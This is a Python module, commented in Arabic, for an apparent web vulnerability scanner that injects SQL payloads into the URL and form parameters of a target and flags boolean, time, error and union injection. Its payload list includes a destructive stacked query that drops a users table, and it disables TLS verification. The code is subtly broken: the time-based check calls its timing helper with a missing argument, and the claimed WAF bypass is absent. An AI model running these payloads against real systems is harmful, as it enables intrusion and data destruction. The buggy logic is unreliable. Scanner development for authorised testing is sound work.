
import asyncio
import re
import time
from typing import Dict, List, Optional, Any, Set, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dataclasses import dataclass

from .base_scanner import BaseScanner, ScanContext, Finding, Severity, Confidence

try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False
    import aiohttp

import logging

logger = logging.getLogger(__name__)


@dataclass
class SQLiPayload:
    """حمولة SQL Injection"""
    name: str
    payload: str
    technique: str  # boolean, time, error, union, stacked
    description: str = ""


class SQLiScanner(BaseScanner):
    """
    فاحص ثغرات SQL Injection
    
    الميزات:
    - اكتشاف Boolean-based Blind SQLi
    - اكتشاف Time-based Blind SQLi
    - اكتشاف Error-based SQLi
    - اكتشاف Union-based SQLi
    - كشف نوع DBMS
    - استخراج البيانات (data extraction)
    - تقنيات تجاوز WAF
    """
    
    # قائمة الحمولات الأساسية
    BASE_PAYLOADS = [
        # Boolean-based
        SQLiPayload("Boolean AND True", "' AND '1'='1", "boolean", "Classic boolean injection"),
        SQLiPayload("Boolean AND False", "' AND '1'='2", "boolean", "Boolean injection (false)"),
        SQLiPayload("Boolean OR True", "' OR '1'='1", "boolean", "OR boolean injection"),
        SQLiPayload("Boolean Comment", "' AND 1=1--", "boolean", "Boolean with comment"),
        SQLiPayload("Boolean Paren", "') AND ('1'='1", "boolean", "Boolean with parentheses"),
        
        # Time-based
        SQLiPayload("Time MySQL", "' AND SLEEP(5)--", "time", "MySQL time-based injection"),
        SQLiPayload("Time PostgreSQL", "' AND pg_sleep(5)--", "time", "PostgreSQL time-based"),
        SQLiPayload("Time MSSQL", "'; WAITFOR DELAY '00:00:05'--", "time", "MSSQL time-based"),
        SQLiPayload("Time Oracle", "' AND DBMS_LOCK.SLEEP(5)--", "time", "Oracle time-based"),
        
        # Error-based
        SQLiPayload("Error MySQL", "' AND extractvalue(1,concat(0x7e,database()))--", "error", "MySQL error-based"),
        SQLiPayload("Error PostgreSQL", "' AND 1=cast((SELECT version()) as int)--", "error", "PostgreSQL error-based"),
        
        # Union-based
        SQLiPayload("Union Basic", "' UNION SELECT NULL--", "union", "Basic UNION injection"),
        SQLiPayload("Union Multi", "' UNION SELECT NULL,NULL,NULL--", "union", "Multi-column UNION"),
        
        # Stacked queries
        SQLiPayload("Stacked MySQL", "'; DROP TABLE users--", "stacked", "Stacked query injection"),
    ]
    
    # إشارات أخطاء SQL
    ERROR_INDICATORS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"ORA-[0-9]{5}",
        r"Oracle error",
        r"SQLite/JDBCDriver",
        r"SQLite.Exception",
        r"System.Data.SQLite.SQLiteException",
        r"Warning.*sqlite_.*",
        r"valid SQLite",
        r"SQL Server.*Driver",
        r"Driver.*SQL Server",
        r"SQLServer JDBC Driver",
        r"com.microsoft.sqlserver",
        r"Unclosed quotation mark",
    ]
    
    # أنماط كشف DBMS
    DBMS_PATTERNS = {
        "MySQL": [r"MySQL", r"MariaDB", r"SQL syntax.*MySQL"],
        "PostgreSQL": [r"PostgreSQL", r"PG::Error", r"valid PostgreSQL result"],
        "MSSQL": [r"Microsoft SQL", r"SQL Server", r"com.microsoft.sqlserver"],
        "Oracle": [r"Oracle", r"ORA-[0-9]{5}"],
        "SQLite": [r"SQLite", r"sqlite_.*", r"SQLite/JDBCDriver"],
    }
    
    def __init__(
        self,
        rate_limit: float = 1.0,
        timeout: int = 30,
        max_retries: int = 2,
        boolean_threshold: float = 0.2,  # نسبة الفرق بين true/false
        time_threshold: float = 4.0,     # ثواني
        extract_data: bool = True
    ):
        super().__init__(
            name="SQLiScanner",
            rate_limit=rate_limit,
            timeout=timeout,
            max_retries=max_retries
        )
        self._boolean_threshold = boolean_threshold
        self._time_threshold = time_threshold
        self._extract_data = extract_data
        self._session = None
        self._tested_params: Set[str] = set()
        self._detected_dbms: Optional[str] = None
    
    async def _get_session(self):
        """الحصول على جلسة HTTP"""
        if not self._session:
            if HTTPX_AVAILABLE:
                self._session = httpx.AsyncClient(
                    timeout=self.timeout,
                    follow_redirects=True,
                    verify=False
                )
            else:
                self._session = aiohttp.ClientSession()
        return self._session
    
    async def can_scan(self, context: ScanContext) -> bool:
        """التحقق من وجود معاملات قابلة للاختبار"""
        url = context.target.url
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        post_params = context.target.data or {}
        
        return len(params) > 0 or len(post_params) > 0
    
    async def scan(self, context: ScanContext) -> List[Finding]:
        """تنفيذ فحص SQL Injection"""
        findings = []
        url = context.target.url
        method = context.target.method
        
        # استخراج المعاملات
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        params = context.target.params.copy()
        
        all_params = {}
        for key, values in query_params.items():
            all_params[key] = values[0] if values else ""
        all_params.update(params)
        
        # معاملات POST
        post_params = context.target.data.copy() if context.target.data else {}
        
        # 1. فحص Boolean-based
        boolean_findings = await self._scan_boolean_based(
            context, all_params, post_params, method
        )
        findings.extend(boolean_findings)
        
        # 2. فحص Time-based
        if not findings:  # فقط إذا لم نجد ثغرة سابقة
            time_findings = await self._scan_time_based(
                context, all_params, post_params, method
            )
            findings.extend(time_findings)
        
        # 3. فحص Error-based
        error_findings = await self._scan_error_based(
            context, all_params, post_params, method
        )
        findings.extend(error_findings)
        
        # 4. فحص Union-based
        union_findings = await self._scan_union_based(
            context, all_params, post_params, method
        )
        findings.extend(union_findings)
        
        # 5. استخراج البيانات إذا تم العثور على ثغرة
        if self._extract_data and findings:
            for finding in findings:
                if finding.confidence == Confidence.HIGH:
                    data = await self._extract_database_info(
                        context, finding.parameter, finding.metadata.get("technique", "boolean")
                    )
                    if data:
                        finding.metadata["extracted_data"] = data
        
        return findings
    
    async def _scan_boolean_based(
        self,
        context: ScanContext,
        get_params: Dict[str, str],
        post_params: Dict[str, str],
        method: str
    ) -> List[Finding]:
        """فحص Boolean-based Blind SQL Injection"""
        findings = []
        
        # الحمولات المنطقية
        true_payloads = [p for p in self.BASE_PAYLOADS if p.technique == "boolean" and "'1'='1" in p.payload]
        false_payloads = [p for p in self.BASE_PAYLOADS if p.technique == "boolean" and "'1'='2" in p.payload]
        
        if not true_payloads or not false_payloads:
            return findings
        
        true_payload = true_payloads[0]
        false_payload = false_payloads[0]
        
        # اختبار معاملات GET
        for param_name in get_params:
            if param_name in self._tested_params:
                continue
            
            # قياس الاستجابة العادية (baseline)
            baseline_time, baseline_length = await self._send_and_measure(
                context, param_name, get_params[param_name], post_params, method
            )
            
            # اختبار الحمولة الصحيحة
            true_resp = await self._test_payload(
                context, param_name, get_params[param_name], true_payload.payload, post_params, method
            )
            
            if not true_resp:
                continue
            
            true_time, true_length = true_resp
            
            # اختبار الحمولة الخاطئة
            false_resp = await self._test_payload(
                context, param_name, get_params[param_name], false_payload.payload, post_params, method
            )
            
            if not false_resp:
                continue
            
            false_time, false_length = false_resp
            
            # حساب الفرق
            length_diff = abs(true_length - false_length)
            length_change_ratio = length_diff / max(true_length, false_length)
            
            # إذا كان الفرق كبيراً، هناك ثغرة محتملة
            if length_change_ratio > self._boolean_threshold:
                finding = self.add_finding(
                    vulnerability_type="SQL Injection (Boolean-based Blind)",
                    severity=Severity.CRITICAL,
                    confidence=Confidence.HIGH,
                    url=context.target.url,
                    parameter=param_name,
                    payload=true_payload.payload,
                    evidence=f"Boolean injection detected: true/false response length difference {length_diff} bytes ({length_change_ratio*100:.1f}%)",
                    description=f"Boolean-based blind SQL injection discovered using {true_payload.name} technique",
                    remediation="Use parameterized queries/prepared statements. Validate and sanitize all user inputs.",
                    cvss_score=9.8,
                    metadata={"technique": "boolean", "dbms": self._detected_dbms}
                )
                findings.append(finding)
                self._tested_params.add(param_name)
        
        return findings
    
    async def _scan_time_based(
        self,
        context: ScanContext,
        get_params: Dict[str, str],
        post_params: Dict[str, str],
        method: str
    ) -> List[Finding]:
        """فحص Time-based Blind SQL Injection"""
        findings = []
        time_payloads = [p for p in self.BASE_PAYLOADS if p.technique == "time"]
        
        for param_name in get_params:
            if param_name in self._tested_params:
                continue
            
            # قياس وقت الاستجابة العادية
            baseline_time = await self._measure_response_time(
                context, param_name, get_params[param_name], post_params, method
            )
            
            for payload in time_payloads:
                # اختبار الحمولة
                test_time = await self._measure_response_time(
                    context, param_name, get_params[param_name], payload.payload, post_params, method
                )
                
                # إذا كان الفرق أكبر من العتبة
                if test_time - baseline_time > self._time_threshold:
                    finding = self.add_finding(
                        vulnerability_type="SQL Injection (Time-based Blind)",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        url=context.target.url,
                        parameter=param_name,
                        payload=payload.payload,
                        evidence=f"Time-based injection detected: {test_time - baseline_time:.2f}s delay",
                        description=f"Time-based blind SQL injection discovered using {payload.name} technique",
                        remediation="Use parameterized queries/prepared statements. Implement proper input validation.",
                        cvss_score=7.5,
                        metadata={"technique": "time", "delay_seconds": test_time - baseline_time}
                    )
                    findings.append(finding)
                    self._tested_params.add(param_name)
                    break
        
        return findings
    
    async def _scan_error_based(
        self,
        context: ScanContext,
        get_params: Dict[str, str],
        post_params: Dict[str, str],
        method: str
    ) -> List[Finding]:
        """فحص Error-based SQL Injection"""
        findings = []
        error_payloads = [p for p in self.BASE_PAYLOADS if p.technique == "error"]
        
        for param_name in get_params:
            if param_name in self._tested_params:
                continue
            
            for payload in error_payloads:
                response = await self._send_payload(
                    context, param_name, get_params[param_name], payload.payload, post_params, method
                )
                
                if response:
                    body = response.text if hasattr(response, 'text') else str(response)
                    
                    # البحث عن أخطاء SQL
                    for pattern in self.ERROR_INDICATORS:
                        if re.search(pattern, body, re.IGNORECASE):
                            # كشف نوع DBMS
                            self._detected_dbms = self._detect_dbms(body)
                            
                            finding = self.add_finding(
                                vulnerability_type="SQL Injection (Error-based)",
                                severity=Severity.CRITICAL,
                                confidence=Confidence.CERTAIN,
                                url=context.target.url,
                                parameter=param_name,
                                payload=payload.payload,
                                evidence=f"SQL error detected: {re.search(pattern, body, re.IGNORECASE).group()[:200]}",
                                description=f"Error-based SQL injection discovered using {payload.name} technique. DBMS: {self._detected_dbms or 'Unknown'}",
                                remediation="Use parameterized queries. Don't expose database errors to users.",
                                cvss_score=8.8,
                                metadata={"technique": "error", "dbms": self._detected_dbms}
                            )
                            findings.append(finding)
                            self._tested_params.add(param_name)
                            break
            
            if param_name in self._tested_params:
                continue
        
        return findings
    
    async def _scan_union_based(
        self,
        context: ScanContext,
        get_params: Dict[str, str],
        post_params: Dict[str, str],
        method: str
    ) -> List[Finding]:
        """فحص Union-based SQL Injection"""
        findings = []
        
        # تحديد عدد الأعمدة
        for param_name in get_params:
            if param_name in self._tested_params:
                continue
            
            column_count = await self._find_union_columns(
                context, param_name, get_params[param_name], post_params, method
            )
            
            if column_count > 0:
                finding = self.add_finding(
                    vulnerability_type="SQL Injection (Union-based)",
                    severity=Severity.CRITICAL,
                    confidence=Confidence.HIGH,
                    url=context.target.url,
                    parameter=param_name,
                    description=f"Union-based SQL injection discovered. Query has {column_count} columns.",
                    remediation="Use parameterized queries. Restrict UNION queries if not needed.",
                    cvss_score=8.8,
                    metadata={"technique": "union", "column_count": column_count}
                )
                findings.append(finding)
                self._tested_params.add(param_name)
        
        return findings
    
    async def _find_union_columns(
        self,
        context: ScanContext,
        param_name: str,
        original_value: str,
        post_params: Dict[str, str],
        method: str
    ) -> int:
        """تحديد عدد الأعمدة في استعلام UNION"""
        for num_cols in range(1, 20):
            nulls = ",".join(["NULL"] * num_cols)
            union_payload = f"' UNION SELECT {nulls}--"
            
            response = await self._send_payload(
                context, param_name, original_value, union_payload, post_params, method
            )
            
            if response and hasattr(response, 'status_code'):
                if response.status_code == 200:
                    return num_cols
        
        return 0
    
    async def _send_payload(
        self,
        context: ScanContext,
        param_name: str,
        original_value: str,
        payload: str,
        post_params: Dict[str, str],
        method: str
    ):
        """إرسال حمولة إلى الهدف"""
        session = await self._get_session()
        url = context.target.url
        
        # بناء URL مع الحمولة
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        query_params[param_name] = [payload]
        new_query = urlencode(query_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        headers = context.target.headers.copy()
        
        try:
            if method == "GET":
                if HTTPX_AVAILABLE:
                    return await session.get(test_url, headers=headers)
                else:
                    async with session.get(test_url, headers=headers) as resp:
                        return resp
            else:
                # POST data
                modified_post = post_params.copy()
                modified_post[param_name] = payload
                if HTTPX_AVAILABLE:
                    return await session.post(url, data=modified_post, headers=headers)
                else:
                    async with session.post(url, data=modified_post, headers=headers) as resp:
                        return resp
        except Exception as e:
            logger.debug(f"Error sending payload: {e}")
            return None
    
    async def _send_and_measure(
        self,
        context: ScanContext,
        param_name: str,
        original_value: str,
        post_params: Dict[str, str],
        method: str
    ) -> Tuple[float, int]:
        """إرسال طلب وقياس الوقت والحجم"""
        start_time = time.time()
        response = await self._send_payload(
            context, param_name, original_value, original_value, post_params, method
        )
        elapsed = time.time() - start_time
        
        if response and hasattr(response, 'text'):
            content = response.text if hasattr(response, 'text') else str(response)
            return elapsed, len(content)
        
        return elapsed, 0
    
    async def _measure_response_time(
        self,
        context: ScanContext,
        param_name: str,
        original_value: str,
        payload: str,
        post_params: Dict[str, str],
        method: str
    ) -> float:
        """قياس وقت استجابة الطلب"""
        start_time = time.time()
        await self._send_payload(context, param_name, original_value, payload, post_params, method)
        return time.time() - start_time
    
    async def _test_payload(
        self,
        context: ScanContext,
        param_name: str,
        original_value: str,
        payload: str,
        post_params: Dict[str, str],
        method: str
    ) -> Optional[Tuple[float, int]]:
        """اختبار حمولة وإرجاع الوقت والحجم"""
        response = await self._send_payload(
            context, param_name, original_value, payload, post_params, method
        )
        
        if response and hasattr(response, 'text'):
            content = response.text if hasattr(response, 'text') else str(response)
            return 0, len(content)
        
        return None
    
    def _detect_dbms(self, error_message: str) -> Optional[str]:
        """كشف نوع DBMS من رسالة الخطأ"""
        for dbms, patterns in self.DBMS_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, error_message, re.IGNORECASE):
                    return dbms
        return None
    
    async def _extract_database_info(
        self,
        context: ScanContext,
        parameter: str,
        technique: str
    ) -> Dict[str, Any]:
        """
        استخراج معلومات قاعدة البيانات (بسيط)
        يتم توسيعه لاحقاً
        """
        # Placeholder for database extraction
        # سيتم تنفيذه في الإصدارات القادمة
        return {
            "database": "Unknown",
            "version": "Unknown",
            "tables": []
        }
    
    async def close(self):
        """إغلاق الجلسة"""
        if self._session:
            if HTTPX_AVAILABLE:
                await self._session.aclose()
            else:
                await self._session.close()
            self._session = None

